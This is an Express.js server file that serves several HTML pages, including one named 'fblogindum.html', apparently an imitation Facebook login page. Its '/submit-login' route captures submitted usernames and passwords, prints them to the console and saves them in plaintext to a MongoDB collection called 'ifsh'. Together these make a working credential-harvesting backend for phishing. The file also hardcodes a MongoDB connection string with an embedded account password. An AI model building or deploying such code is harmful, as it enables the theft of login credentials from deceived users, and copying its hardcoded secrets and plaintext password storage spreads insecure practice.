const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const { MongoClient } = require('mongodb');

const uri = "mongodb+srv://garycantilang:<0xMkSE6i57Nm5hUd>@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const client = new MongoClient(uri);

let db; // Declare the db variable

async function connectToDatabase() {
    try {
        await client.connect();
        db = client.db('<logdata>'); // Assign your database name here
        console.log("Connected to MongoDB");
    } catch (error) {
        console.error("MongoDB connection error:", error);
    }
}

connectToDatabase();

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from the "public" directory

// Route to handle login form submission
app.post('/submit-login', async (req, res) => {
    const { username, password } = req.body;

    try {
        if (!db) {
            console.error("Database connection not initialized.");
            throw new Error("Database connection not initialized");
        }
        
        const loginData = { username, password, timestamp: new Date() };
        
        // Log before inserting data
        console.log("Attempting to insert data:", loginData);
        
        const result = await db.collection('ifsh').insertOne(loginData);
        
        // Log the result after successful insertion
        console.log("Data inserted successfully:", result);
        
        res.send('Login information saved successfully to MongoDB.');
    } catch (error) {
        console.error('Error saving data to MongoDB:', error);
        res.status(500).send('Error saving data to MongoDB.');
    }
});

// Route to serve the homepage
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Home.html')); // Change 'index.html' to your main HTML file name
});
app.get('/Job Postings.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Job Postings.html')); // Change 'index.html' to your main HTML file name
});
app.get('/Announcements.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Announcements.html')); // Change  'index.html' to your main HTML file name
});
app.get('/public/fblogindum.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'fblogindum.html')); // Change 'index.html' to your main HTML file name
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
